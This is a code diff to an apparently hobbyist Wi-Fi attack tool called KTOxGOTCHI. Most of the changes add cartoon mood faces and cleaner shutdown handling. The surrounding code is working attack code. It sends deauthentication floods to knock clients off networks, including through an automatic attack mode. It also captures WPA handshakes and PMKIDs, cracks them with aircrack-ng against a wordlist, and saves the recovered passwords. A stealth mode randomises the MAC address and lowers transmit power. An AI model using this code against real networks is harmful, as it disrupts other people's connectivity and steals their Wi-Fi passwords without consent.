@@ -29,6 +29,7 @@ import os
 import sys
 import time
 import json
+import signal
 import threading
 import subprocess
 import random
@@ -193,32 +194,54 @@ settings_idx = 0
 
 # Cute faces (original KTOxGOTCHI style)
 faces = {
-    "normal":   "(◕‿‿◕)",
-    "happy":    "(◕‿‿◕)",
-    "attacking": "(⌐■_■)",
-    "lost":     "(X\\/X)",
-    "assoc":    "(°▃▃°)",
-    "excited":  "(☼‿‿☼)",
-    "missed":   "(☼/\\☼)",
+    "normal":    "(◕‿‿◕)",
+    "blink":     "(-‿‿-)",
+    "happy":     "(≧◡≦)",
+    "excited":   "(☼‿‿☼)",
+    "cracked":   "(★‿★)",
+    "cracking":  "(⊙_⊙)",
+    "attacking":  "(⌐■_■)",
+    "deauthing": "(◣_◢)",
+    "pmkid":     "(ᗒᗨᗕ)",
+    "half":      "(◕∇◕)",
+    "assoc":     "(°▃▃°)",
+    "lost":      "(X\\/X)",
+    "missed":    "(☼/\\☼)",
     "searching": "(ಠ_↼ )",
-    "stealth":  "(#‿‿#)",
-    "sleeping": "(－_－)",
+    "scanning":  "(ó_ò )",
+    "waiting":   "(·_·  )",
+    "stealth":   "(#‿‿#)",
+    "sleeping":  "(－_－)",
 }
 mood_timer = None
+
+_MOOD_DURATIONS = {
+    # mood: seconds before returning to "normal" (0 = stays until changed)
+    "happy":     5.0,
+    "excited":   4.0,
+    "cracked":   6.0,
+    "cracking":  0,      # stays until cracking completes
+    "attacking":  2.5,
+    "deauthing": 3.0,
+    "pmkid":     5.0,
+    "half":      4.0,
+    "assoc":     3.0,
+    "lost":      3.0,
+    "missed":    2.0,
+    "searching": 2.5,
+    "scanning":  0,      # stays until channel hopper resets it
+    "waiting":   0,
+}
 
 def set_mood(new_mood):
     global mood, mood_timer
     mood = new_mood
     if mood_timer:
         mood_timer.cancel()
-    if new_mood in ("attacking", "assoc", "lost", "missed", "searching"):
-        mood_timer = threading.Timer(2.0, lambda: set_mood("normal"))
-        mood_timer.start()
-    elif new_mood == "happy":
-        mood_timer = threading.Timer(4.0, lambda: set_mood("normal"))
-        mood_timer.start()
-    elif new_mood == "excited":
-        mood_timer = threading.Timer(3.0, lambda: set_mood("normal"))
+        mood_timer = None
+    dur = _MOOD_DURATIONS.get(new_mood)
+    if dur:
+        mood_timer = threading.Timer(dur, lambda: set_mood("normal"))
         mood_timer.start()
 
 # ----------------------------------------------------------------------
@@ -281,6 +304,22 @@ def get_mac(iface):
         with open(f"/sys/class/net/{iface}/address") as f:
             return f.read().strip().upper()
     except: return ""
+
+def _kill_proc(proc):
+    """Terminate a subprocess and wait; escalate to SIGKILL if needed."""
+    if proc is None:
+        return
+    try:
+        proc.terminate()
+        proc.wait(timeout=3)
+    except subprocess.TimeoutExpired:
+        try:
+            proc.kill()
+            proc.wait(timeout=2)
+        except Exception:
+            pass
+    except Exception:
+        pass
 
 def randomize_mac(iface):
     new_mac = "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0,255) for _ in range(5))
@@ -366,7 +405,6 @@ def manual_crack():
             d.text((4, y), fname[:20], font=f9, fill=(171, 178, 185))
             y += 12
         d.text((4, H-30), f"{len(caps)} total", font=f9, fill=(171, 178, 185))
-        d.rectangle((0, H-12, W, H), fill=(34, 0, 0))
         d.text((4, H-10), "U/D OK K3=Back", font=f9, fill=(192, 57, 43))
         LCD.LCD_ShowImage(img, 0, 0)
         btn = wait_btn(0.2)
@@ -397,7 +435,7 @@ def manual_crack():
                 global cracked_count
                 cracked_count += 1
                 save_stats()
-                set_mood("excited")
+                set_mood("cracked")
                 # Show password
                 img3 = Image.new("RGB", (W, H), "#0A0000")
                 d3 = ImageDraw.Draw(img3)
@@ -491,6 +529,7 @@ def try_crack(cap_path, essid, bssid):
     global cracked_count
     if not os.path.exists(WORDLIST):
         return None
+    set_mood("cracking")
     result = subprocess.run(f"aircrack-ng -w {WORDLIST} {cap_path} 2>/dev/null", shell=True, capture_output=True, text=True)
     m = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", result.stdout)
     if m:
@@ -502,7 +541,9 @@ def try_crack(cap_path, essid, bssid):
             f.write(f"ESSID: {essid}\nBSSID: {bssid}\nPASSWORD: {password}\nDate: {datetime.now().isoformat()}\n")
         cracked_count += 1
         save_stats()
+        set_mood("cracked")
         return password
+    set_mood("lost")
     return None
 
 def packet_handler(pkt):
@@ -599,7 +640,7 @@ def packet_handler(pkt):
                                             last_capture_ssid = essid
                                             capture_flash = 30
                                             fname = save_capture(bssid, essid, [pkt], "pmkid")
-                                            set_mood("happy")
+                                            set_mood("pmkid")
                                         break
                                 i += (2 + kde_len) if kde_len > 0 else 2
                 except: pass
@@ -659,7 +700,7 @@ def half_hs_checker():
                     last_capture_ssid = essid
                     capture_flash = 20
                     save_capture(bssid, essid, pkts, "hs_half")
-                    set_mood("happy")
+                    set_mood("half")
         time.sleep(2)
 
 # ----------------------------------------------------------------------
@@ -693,6 +734,7 @@ def send_deauth_burst(bssid, clients, iface):
         for reason in reasons:
             pkts.append(RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid, type=0, subtype=12) / Dot11Deauth(reason=reason))
             pkts.append(RadioTap() / Dot11(addr1=bssid, addr2=client, addr3=bssid, type=0, subtype=12) / Dot11Deauth(reason=reason))
+    set_mood("deauthing")
     for _ in range(DEAUTH_BURST_ROUNDS):
         sendp(pkts, iface=iface, count=1, inter=0, verbose=False)
 
@@ -780,6 +822,7 @@ def channel_hopper():
         # Scan hot channels first (APs with clients, uncaptured)
         hot = {}
         with lock:
+            ap_count = len(session_aps)
             for bssid, info in session_aps.items():
                 ch = info.get("channel")
                 if not ch: continue
@@ -791,6 +834,8 @@ def channel_hopper():
                 hot[ch] = (hot[ch][0] + cli, hot[ch][1] or uncap)
         hot_list = [(ch, cli) for ch, (cli, uncap) in hot.items() if uncap and cli > 0]
         hot_list.sort(key=lambda x: x[1], reverse=True)
+        if mood not in ("deauthing", "attacking", "assoc", "happy", "pmkid", "half", "cracking", "cracked"):
+            set_mood("scanning" if ap_count == 0 else "normal")
         visited = set()
         for ch, _ in hot_list:
             if not capture_event.is_set():
@@ -908,8 +953,8 @@ def auto_attack_worker():
                     subprocess.run(f"aireplay-ng --deauth 10 -a {bssid} -c {client} {mon_iface}",
                                    shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                     time.sleep(3)
-                    proc.terminate()
-                    time.sleep(1)
+                    _kill_proc(proc)
+                    time.sleep(0.5)
                     cap_file = f"{tmp_hs}-01.cap"
                     if os.path.exists(cap_file):
                         aircrack_out = subprocess.run(f"aircrack-ng {cap_file} 2>/dev/null", shell=True, capture_output=True, text=True).stdout
@@ -936,7 +981,7 @@ def auto_attack_worker():
                                         cf.write(f"ESSID: {essid}\nBSSID: {bssid}\nPASSWORD: {password}\nDate: {datetime.now().isoformat()}\n")
                                     cracked_count += 1
                                     save_stats()
-                                    set_mood("excited")
+                                    set_mood("cracked")
                             attacked = True
                             time.sleep(8)
                             break
@@ -987,9 +1032,7 @@ def draw_face():
     d.text((2, 14), f"AP:{aps} CLI:{cli}  PWND:{total_pwnd} LT:{lt_total}", font=f9, fill=(171, 178, 185))
 
     # Large face — dominant visual element
-    face_char = faces.get(mood, faces["normal"])
-    if _blink and mood == "normal":
-        face_char = "(◕‿‿◕)"
+    face_char = faces["blink"] if _blink and mood == "normal" else faces.get(mood, faces["normal"])
     face_color = "#00FF00" if capture_event.is_set() else "#666666"
     if capture_flash > 0:
         face_color = "#FFFF00"
@@ -1004,20 +1047,19 @@ def draw_face():
     fw = bbox[2] - bbox[0]
     fh = bbox[3] - bbox[1]
     face_area_top = 26
-    face_area_bot = H - 30
+    face_area_bot = H - 40   # leave room for 3 bottom lines without overlap
     fx = max(0, (W - fw) // 2)
     fy = face_area_top + (face_area_bot - face_area_top - fh) // 2
     d.text((fx, fy), face_char, font=face_font, fill=face_color)
 
-    # Bottom info lines
+    # Bottom info — no filled rectangle so nothing gets covered
     if last:
-        d.text((2, H - 28), f">{last[:22]}", font=f9, fill=(30, 132, 73))
+        d.text((2, H - 30), f">{last[:22]}", font=f9, fill=(30, 132, 73))
     elapsed = int(time.time() - start_time)
     mode_ch = f"{'A' if auto_attack else 'M'} ch{current_channel}"
     uptime = f"{elapsed//3600:02d}:{(elapsed%3600)//60:02d}:{elapsed%60:02d}"
-    d.text((2, H - 18), f"{mode_ch}  {uptime}", font=f9, fill=(113, 125, 126))
-    d.rectangle((0, H - 12, W, H), fill=(34, 0, 0))
-    d.text((4, H - 10), "K1=View K2=Menu K3=Exit", font=f9, fill=(192, 57, 43))
+    d.text((2, H - 20), f"{mode_ch}  {uptime}", font=f9, fill=(113, 125, 126))
+    d.text((2, H - 10), "K1=View K2=Menu K3=Exit", font=f9, fill=(192, 57, 43))
     LCD.LCD_ShowImage(img, 0, 0)
 
 def draw_stats():
@@ -1032,9 +1074,8 @@ def draw_stats():
         d.text((4, y), f"PMKID: {session_pmkid}", font=f9, fill=(171, 178, 185)); y += 12
         d.text((4, y), f"Deauths: {session_deauths}", font=f9, fill=(171, 178, 185)); y += 12
         d.text((4, y), f"Peers: {len(peers_detected)}", font=f9, fill=(171, 178, 185)); y += 12
-    d.text((4, H-30), "Lifetime totals:", font=f9, fill=(171, 178, 185)); y = H-18
+    d.text((4, H-30), "Lifetime totals:", font=f9, fill=(171, 178, 185)); y = H-20
     d.text((4, y), f"HS:{lifetime_handshakes} H:{lifetime_half_hs} P:{lifetime_pmkid}", font=f9, fill=(113, 125, 126))
-    d.rectangle((0, H-12, W, H), fill=(34, 0, 0))
     d.text((4, H-10), "K1=Back K3=Exit", font=f9, fill=(192, 57, 43))
     LCD.LCD_ShowImage(img, 0, 0)
 
@@ -1054,7 +1095,6 @@ def draw_captures(scroll):
         d.text((4, H-30), f"{len(files)} total", font=f9, fill=(171, 178, 185))
     else:
         d.text((4, 40), "No captures yet", font=f9, fill=(113, 125, 126))
-    d.rectangle((0, H-12, W, H), fill=(34, 0, 0))
     d.text((4, H-10), "U/D:Scroll K1:Back K3:Exit", font=f9, fill=(192, 57, 43))
     LCD.LCD_ShowImage(img, 0, 0)
 
@@ -1080,7 +1120,6 @@ def draw_target_list():
     for line in lines:
         d.text((4, y), line[:23], font=f9, fill=(171, 178, 185))
         y += 12
-    d.rectangle((0, H-12, W, H), fill=(34, 0, 0))
     d.text((4, H-10), "UP/DN OK K3=Back", font=f9, fill=(192, 57, 43))
     LCD.LCD_ShowImage(img, 0, 0)
 
@@ -1106,7 +1145,6 @@ def draw_settings():
             line = f"{prefix}{opt}"
         d.text((4, y), line[:22], font=f9, fill=(171, 178, 185) if i == settings_idx else "#AAAAAA")
         y += 12
-    d.rectangle((0, H-12, W, H), fill=(34, 0, 0))
     d.text((4, H-10), "U/D OK K3=Back", font=f9, fill=(192, 57, 43))
     LCD.LCD_ShowImage(img, 0, 0)
 
@@ -1152,6 +1190,13 @@ def main():
         time.sleep(3)
         return
 
+    # Catch SIGTERM/SIGINT — set shutdown event so the main loop and all
+    # daemon threads exit cleanly instead of being killed mid-cleanup.
+    def _stop(sig, frame):
+        shutdown.set()
+    signal.signal(signal.SIGTERM, _stop)
+    signal.signal(signal.SIGINT, _stop)
+
     # Start capturing immediately — without this, channel_hopper and
     # packet_handler both exit/skip immediately since they gate on this event.
     capture_event.set()
@@ -1178,188 +1223,195 @@ def main():
         auto_attack_stop.clear()
         threading.Thread(target=auto_attack_worker, daemon=True).start()
 
-    while not shutdown.is_set():
-        btn = wait_btn(0.2)
-        if state == "main":
-            if view == "face":
-                draw_face()
-            elif view == "stats":
-                draw_stats()
-            elif view == "captures":
-                draw_captures(scroll)
-
-            if btn == "KEY3":
-                break
-            elif btn == "KEY1":
+    try:
+        while not shutdown.is_set():
+            btn = wait_btn(0.2)
+            if state == "main":
                 if view == "face":
-                    view = "stats"
+                    draw_face()
                 elif view == "stats":
-                    view = "captures"
-                else:
-                    view = "face"
-                scroll = 0
-                time.sleep(0.3)
-            elif btn == "KEY2":
-                state = "settings"
-                settings_idx = 0
-                draw_settings()
-                time.sleep(0.3)
-            elif btn == "LEFT" and view == "face":
-                deauth_enabled = not deauth_enabled
-                save_config()
-                time.sleep(0.3)
-            elif btn == "RIGHT" and view == "face":
-                stealth_enabled = not stealth_enabled
-                if stealth_enabled and mon_iface:
-                    randomize_mac(mon_iface)
-                    reduce_tx_power(mon_iface)
-                elif not stealth_enabled and mon_iface:
-                    restore_mac(mon_iface, original_mac)
-                    restore_tx_power(mon_iface)
-                save_config()
-                time.sleep(0.3)
-            elif btn == "UP" and view == "captures":
-                scroll = max(0, scroll-1)
-            elif btn == "DOWN" and view == "captures":
-                scroll += 1
-            elif btn == "OK":
-                if not auto_attack:
-                    state = "target_select"
-                    scan_networks_quick(10)
-                    selected_idx = 0
+                    draw_stats()
+                elif view == "captures":
+                    draw_captures(scroll)
+
+                if btn == "KEY3":
+                    break
+                elif btn == "KEY1":
+                    if view == "face":
+                        view = "stats"
+                    elif view == "stats":
+                        view = "captures"
+                    else:
+                        view = "face"
+                    scroll = 0
+                    time.sleep(0.3)
+                elif btn == "KEY2":
+                    state = "settings"
+                    settings_idx = 0
+                    draw_settings()
+                    time.sleep(0.3)
+                elif btn == "LEFT" and view == "face":
+                    deauth_enabled = not deauth_enabled
+                    save_config()
+                    time.sleep(0.3)
+                elif btn == "RIGHT" and view == "face":
+                    stealth_enabled = not stealth_enabled
+                    if stealth_enabled and mon_iface:
+                        randomize_mac(mon_iface)
+                        reduce_tx_power(mon_iface)
+                    elif not stealth_enabled and mon_iface:
+                        restore_mac(mon_iface, original_mac)
+                        restore_tx_power(mon_iface)
+                    save_config()
+                    time.sleep(0.3)
+                elif btn == "UP" and view == "captures":
+                    scroll = max(0, scroll-1)
+                elif btn == "DOWN" and view == "captures":
+                    scroll += 1
+                elif btn == "OK":
+                    if not auto_attack:
+                        state = "target_select"
+                        scan_networks_quick(10)
+                        selected_idx = 0
+                        draw_target_list()
+            elif state == "target_select":
+                draw_target_list()
+                if btn == "KEY3":
+                    state = "main"
+                elif btn == "UP" and networks:
+                    selected_idx = (selected_idx - 1) % len(networks)
                     draw_target_list()
-        elif state == "target_select":
-            draw_target_list()
-            if btn == "KEY3":
-                state = "main"
-            elif btn == "UP" and networks:
-                selected_idx = (selected_idx - 1) % len(networks)
-                draw_target_list()
-            elif btn == "DOWN" and networks:
-                selected_idx = (selected_idx + 1) % len(networks)
-                draw_target_list()
-            elif btn == "OK" and networks:
-                target = networks[selected_idx]
-                # Single attack
-                set_mood("assoc")
-                ch = int(target["channel"])
-                bssid = target["bssid"]
-                essid = target["essid"]
-                # Get clients
-                tmp = f"/tmp/ktoxgotchi_clients_{bssid.replace(':', '_')}"
-                subprocess.run(f"rm -f {tmp}*", shell=True)
-                subprocess.run(
-                    f"timeout 6 airodump-ng -c {ch} --bssid {bssid} -w {tmp} {mon_iface}",
-                    shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-                )
-                time.sleep(1)
-                clients = []
-                csv_file = f"{tmp}-01.csv"
-                if os.path.exists(csv_file):
-                    with open(csv_file, errors="ignore") as f:
-                        content = f.read()
-                    if "Station MAC" in content:
-                        station_section = content.split("Station MAC")[1]
-                        for line in station_section.strip().split("\n"):
-                            parts = [p.strip() for p in line.split(",")]
-                            if parts and re.match(r"([0-9A-Fa-f]{2}:){5}", parts[0]):
-                                clients.append(parts[0])
-                if clients:
-                    client = random.choice(clients)
-                    tmp_hs = f"/tmp/ktoxgotchi_manual_{bssid.replace(':', '_')}"
-                    subprocess.run(f"rm -f {tmp_hs}*", shell=True)
-                    proc = subprocess.Popen(
-                        f"airodump-ng -c {ch} --bssid {bssid} -w {tmp_hs} {mon_iface}",
+                elif btn == "DOWN" and networks:
+                    selected_idx = (selected_idx + 1) % len(networks)
+                    draw_target_list()
+                elif btn == "OK" and networks:
+                    target = networks[selected_idx]
+                    # Single attack
+                    set_mood("assoc")
+                    ch = int(target["channel"])
+                    bssid = target["bssid"]
+                    essid = target["essid"]
+                    # Get clients
+                    tmp = f"/tmp/ktoxgotchi_clients_{bssid.replace(':', '_')}"
+                    subprocess.run(f"rm -f {tmp}*", shell=True)
+                    subprocess.run(
+                        f"timeout 6 airodump-ng -c {ch} --bssid {bssid} -w {tmp} {mon_iface}",
                         shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                     )
-                    time.sleep(2)
-                    subprocess.run(f"aireplay-ng --deauth 10 -a {bssid} -c {client} {mon_iface}",
-                                   shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                    time.sleep(3)
-                    proc.terminate()
                     time.sleep(1)
-                    cap_file = f"{tmp_hs}-01.cap"
-                    if os.path.exists(cap_file):
-                        aircrack_out = subprocess.run(f"aircrack-ng {cap_file} 2>/dev/null", shell=True, capture_output=True, text=True).stdout
-                        if "handshake" in aircrack_out.lower():
-                            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-                            safe_essid = "".join(c for c in essid if c.isalnum() or c in "._-")[:30] or "unknown"
-                            dest = os.path.join(HANDSHAKE_DIR, f"{safe_essid}_{bssid}_{ts}.cap")
-                            subprocess.run(f"cp {cap_file} {dest}", shell=True)
-                            with open(os.path.join(LOOT_DIR, "handshake_log.txt"), "a") as log:
-                                log.write(f"{ts} | {essid} | {bssid} | {dest}\n")
-                            session_handshakes += 1
-                            lifetime_handshakes += 1
-                            save_stats()
-                            set_mood("happy")
-                            if os.path.exists(WORDLIST):
-                                crack_result = subprocess.run(f"aircrack-ng -w {WORDLIST} {dest} 2>/dev/null", shell=True, capture_output=True, text=True).stdout
-                                key_match = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", crack_result)
-                                if key_match:
-                                    password = key_match.group(1)
-                                    cracked_file = os.path.join(CRACKED_DIR, f"{safe_essid}_{bssid}_{ts}.txt")
-                                    with open(cracked_file, "w") as cf:
-                                        cf.write(f"ESSID: {essid}\nBSSID: {bssid}\nPASSWORD: {password}\nDate: {datetime.now().isoformat()}\n")
-                                    cracked_count += 1
-                                    save_stats()
-                                    set_mood("excited")
-                state = "main"
-                time.sleep(2)
-        elif state == "settings":
-            draw_settings()
-            if btn == "KEY3":
-                state = "main"
-                save_config()
-                # If auto_attack changed, start/stop worker
-                if auto_attack:
-                    if auto_attack_stop.is_set():
-                        auto_attack_stop.clear()
-                        threading.Thread(target=auto_attack_worker, daemon=True).start()
-                else:
-                    auto_attack_stop.set()
-                # Apply stealth changes immediately
-                if stealth_enabled and mon_iface:
-                    randomize_mac(mon_iface)
-                    reduce_tx_power(mon_iface)
-                elif not stealth_enabled and mon_iface:
-                    restore_mac(mon_iface, original_mac)
-                    restore_tx_power(mon_iface)
-                time.sleep(0.3)
-            elif btn == "UP":
-                settings_idx = (settings_idx - 1) % len(settings_options)
-            elif btn == "DOWN":
-                settings_idx = (settings_idx + 1) % len(settings_options)
-            elif btn == "OK":
-                opt = settings_options[settings_idx]
-                if opt == "Crack Handshakes":
-                    manual_crack()
-                elif opt == "Stealth Mode":
-                    stealth_enabled = not stealth_enabled
-                elif opt == "Deauth":
-                    deauth_enabled = not deauth_enabled
-                elif opt == "Auto Attack":
-                    auto_attack = not auto_attack
-                elif opt == "Whitelist":
-                    show_whitelist()
-                elif opt == "Reset Stats":
-                    reset_stats()
+                    clients = []
+                    csv_file = f"{tmp}-01.csv"
+                    if os.path.exists(csv_file):
+                        with open(csv_file, errors="ignore") as f:
+                            content = f.read()
+                        if "Station MAC" in content:
+                            station_section = content.split("Station MAC")[1]
+                            for line in station_section.strip().split("\n"):
+                                parts = [p.strip() for p in line.split(",")]
+                                if parts and re.match(r"([0-9A-Fa-f]{2}:){5}", parts[0]):
+                                    clients.append(parts[0])
+                    if clients:
+                        client = random.choice(clients)
+                        tmp_hs = f"/tmp/ktoxgotchi_manual_{bssid.replace(':', '_')}"
+                        subprocess.run(f"rm -f {tmp_hs}*", shell=True)
+                        proc = subprocess.Popen(
+                            f"airodump-ng -c {ch} --bssid {bssid} -w {tmp_hs} {mon_iface}",
+                            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+                        )
+                        time.sleep(2)
+                        subprocess.run(f"aireplay-ng --deauth 10 -a {bssid} -c {client} {mon_iface}",
+                                       shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                        time.sleep(3)
+                        _kill_proc(proc)
+                        time.sleep(0.5)
+                        cap_file = f"{tmp_hs}-01.cap"
+                        if os.path.exists(cap_file):
+                            aircrack_out = subprocess.run(f"aircrack-ng {cap_file} 2>/dev/null", shell=True, capture_output=True, text=True).stdout
+                            if "handshake" in aircrack_out.lower():
+                                ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+                                safe_essid = "".join(c for c in essid if c.isalnum() or c in "._-")[:30] or "unknown"
+                                dest = os.path.join(HANDSHAKE_DIR, f"{safe_essid}_{bssid}_{ts}.cap")
+                                subprocess.run(f"cp {cap_file} {dest}", shell=True)
+                                with open(os.path.join(LOOT_DIR, "handshake_log.txt"), "a") as log:
+                                    log.write(f"{ts} | {essid} | {bssid} | {dest}\n")
+                                session_handshakes += 1
+                                lifetime_handshakes += 1
+                                save_stats()
+                                set_mood("happy")
+                                if os.path.exists(WORDLIST):
+                                    crack_result = subprocess.run(f"aircrack-ng -w {WORDLIST} {dest} 2>/dev/null", shell=True, capture_output=True, text=True).stdout
+                                    key_match = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", crack_result)
+                                    if key_match:
+                                        password = key_match.group(1)
+                                        cracked_file = os.path.join(CRACKED_DIR, f"{safe_essid}_{bssid}_{ts}.txt")
+                                        with open(cracked_file, "w") as cf:
+                                            cf.write(f"ESSID: {essid}\nBSSID: {bssid}\nPASSWORD: {password}\nDate: {datetime.now().isoformat()}\n")
+                                        cracked_count += 1
+                                        save_stats()
+                                        set_mood("cracked")
+                    state = "main"
+                    time.sleep(2)
+            elif state == "settings":
                 draw_settings()
-                time.sleep(0.3)
-        time.sleep(0.05)
+                if btn == "KEY3":
+                    state = "main"
+                    save_config()
+                    # If auto_attack changed, start/stop worker
+                    if auto_attack:
+                        if auto_attack_stop.is_set():
+                            auto_attack_stop.clear()
+                            threading.Thread(target=auto_attack_worker, daemon=True).start()
+                    else:
+                        auto_attack_stop.set()
+                    # Apply stealth changes immediately
+                    if stealth_enabled and mon_iface:
+                        randomize_mac(mon_iface)
+                        reduce_tx_power(mon_iface)
+                    elif not stealth_enabled and mon_iface:
+                        restore_mac(mon_iface, original_mac)
+                        restore_tx_power(mon_iface)
+                    time.sleep(0.3)
+                elif btn == "UP":
+                    settings_idx = (settings_idx - 1) % len(settings_options)
+                elif btn == "DOWN":
+                    settings_idx = (settings_idx + 1) % len(settings_options)
+                elif btn == "OK":
+                    opt = settings_options[settings_idx]
+                    if opt == "Crack Handshakes":
+                        manual_crack()
+                    elif opt == "Stealth Mode":
+                        stealth_enabled = not stealth_enabled
+                    elif opt == "Deauth":
+                        deauth_enabled = not deauth_enabled
+                    elif opt == "Auto Attack":
+                        auto_attack = not auto_attack
+                    elif opt == "Whitelist":
+                        show_whitelist()
+                    elif opt == "Reset Stats":
+                        reset_stats()
+                    draw_settings()
+                    time.sleep(0.3)
+                time.sleep(0.05)
 
-    # Cleanup
-    shutdown.set()
-    capture_event.clear()
-    auto_attack_stop.set()
-    save_stats()
-    save_config()
-    if stealth_enabled and mon_iface:
-        restore_mac(mon_iface, original_mac)
-        restore_tx_power(mon_iface)
-    time.sleep(0.5)
-    monitor_down(mon_iface)
-    LCD.LCD_Clear()
-    GPIO.cleanup()
+    finally:
+        # Always runs: on normal exit, KEY3, exception, or signal
+        shutdown.set()
+        capture_event.clear()
+        auto_attack_stop.set()
+        # Cancel any pending mood timer so it doesn't fire during teardown
+        if mood_timer:
+            mood_timer.cancel()
+        save_stats()
+        save_config()
+        # Let daemon threads see shutdown and exit their loops
+        time.sleep(0.5)
+        if stealth_enabled and mon_iface and original_mac:
+            restore_mac(mon_iface, original_mac)
+            restore_tx_power(mon_iface)
+        if mon_iface:
+            monitor_down(mon_iface)
+        LCD.LCD_Clear()
+        GPIO.cleanup()
 
 if __name__ == "__main__":
     main()
